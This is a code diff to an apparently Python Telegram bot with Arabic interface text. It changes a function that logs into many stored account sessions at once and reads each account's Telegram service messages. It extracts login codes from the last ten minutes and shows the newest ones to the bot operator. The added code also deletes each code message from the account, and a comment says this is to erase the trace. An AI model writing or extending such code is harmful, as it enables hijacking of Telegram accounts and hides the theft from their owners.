@@ -843,29 +843,90 @@ def scan_all_codes(call):
     status_msg = bot.send_message(call.message.chat.id, "•❐• جـاري جـلـب الأكـواد مـن الـحـسـابـات...", parse_mode="Markdown")
     run_async(fetch_all_codes_async(call.from_user.id, status_msg.chat.id, status_msg.message_id))
 
+
+
+
+
+
+
+
+
+
+
+
 async def fetch_all_codes_async(owner_id, chat_id, msg_id):
     accounts = get_all_accounts(owner_id)
-    found_codes = []
-    for acc_id, phone, name, uid, pyro_session in accounts:
-        exec_client = Client(f"code_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
+    if not accounts:
+        bot.edit_message_text("❌ لا تـوجـد حـسـابـات مـضـافـة.", chat_id, msg_id, reply_markup=home_keyboard(owner_id))
+        return
+
+    # دالة داخلية لفحص حساب واحد بسرعة (سيتم تشغيلها بشكل متوازي)
+    async def check_single_account(acc_id, phone, pyro_session):
+        codes = []
+        client = Client(f"code_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
         try:
-            await asyncio.wait_for(exec_client.connect(), timeout=12)
-            async for msg in exec_client.get_chat_history(777000, limit=3):
-                if msg.text and ("Login code" in msg.text or "كود الدخول" in msg.text or "تسجيل الدخول" in msg.text):
-                    match = re.search(r'\b(\d{5})\b', msg.text)
-                    if match:
-                        found_codes.append((phone, match.group(1)))
-                        break
-        except Exception: pass
-        finally:
-            if exec_client.is_connected: await exec_client.disconnect()
-    if found_codes:
-        text = "🛂┊ تـم جـلـب أكـواد الـدخـول:\n\n"
-        for phone, code in found_codes:
-            text += f"⎉╎ الـرقـم: {phone}\n•❐• الـكـود: {code}\n━━━━━━━━━━━━━━━━\n"
-        bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=home_keyboard(owner_id))
-    else:
-        bot.edit_message_text("❌ لـم يـصـل أي كـود جـديـد.", chat_id, msg_id, parse_mode="Markdown", reply_markup=home_keyboard(owner_id))
+            await asyncio.wait_for(client.connect(), timeout=5)
+            ten_mins_ago = time.time() - 600  # 10 دقائق بالثواني
+            
+            async for msg in client.get_chat_history(777000, limit=3):
+                if msg.date and msg.date.timestamp() > ten_mins_ago:
+                    if msg.text and ("Login code" in msg.text or "كود الدخول" in msg.text or "تسجيل الدخول" in msg.text):
+                        match = re.search(r'\b(\d{5})\b', msg.text)
+                        if match:
+                            codes.append({
+                                'phone': phone,
+                                'code': match.group(1),
+                                'time': msg.date.timestamp()
+                            })
+                            # حذف الكود من تليجرام فوراً بعد جلبه لمحو الأثر
+                            try:
+                                await client.delete_messages(777000, msg.id)
+                            except Exception:
+                                pass
+            await client.disconnect()
+        except Exception:
+            if client.is_connected: 
+                await client.disconnect()
+        return codes
+
+    # تشغيل الفحص لجميع الحسابات في نفس الثانية (Parallel Processing)
+    tasks = [check_single_account(acc_id, phone, pyro_session) for acc_id, phone, name, uid, pyro_session in accounts]
+    results = await asyncio.gather(*tasks)
+    
+    # تجميع الأكواد وترتيبها حسب الأحدث (من الأحدث إلى الأقدم)
+    all_codes = [item for sublist in results for item in sublist]
+    all_codes.sort(key=lambda x: x['time'], reverse=True)
+    
+    # أخذ أحدث كودين فقط
+    top_2_codes = all_codes[:2]
+
+    if not top_2_codes:
+        bot.edit_message_text("❌ لـم يـصـل أي كـود جـديـد (خـلال آخـر 10 دقـائـق).", chat_id, msg_id, reply_markup=home_keyboard(owner_id))
+        return
+
+    text = "🛂┊ أكـواد الـدخـول (الأحـدث فـقـط):\n\n"
+    
+    # تنسيق الأحدث أولاً ثم الثاني وقابل للنسخ بضغطة (Markdown)
+    for i, item in enumerate(top_2_codes):
+        label = "🟢 الأحـدث" if i == 0 else "🔵 الـثـانـي"
+        text += (
+            f"{label}\n"
+            f"⎉╎ الـرقـم: {item['phone']}\n"
+            f"•❐• الـكـود: `{item['code']}`\n"  # العلامات ` ` تجعل الكود قابل للنسخ بضغطة واحدة
+            f"━━━━━━━━━━━━━━━━\n"
+        )
+
+    bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=home_keyboard(owner_id))
+
+
+
+
+
+
+
+
+
+
 
 @bot.callback_query_handler(func=lambda call: call.data == "autoterm_manage")
 def autoterm_manage_menu(call):
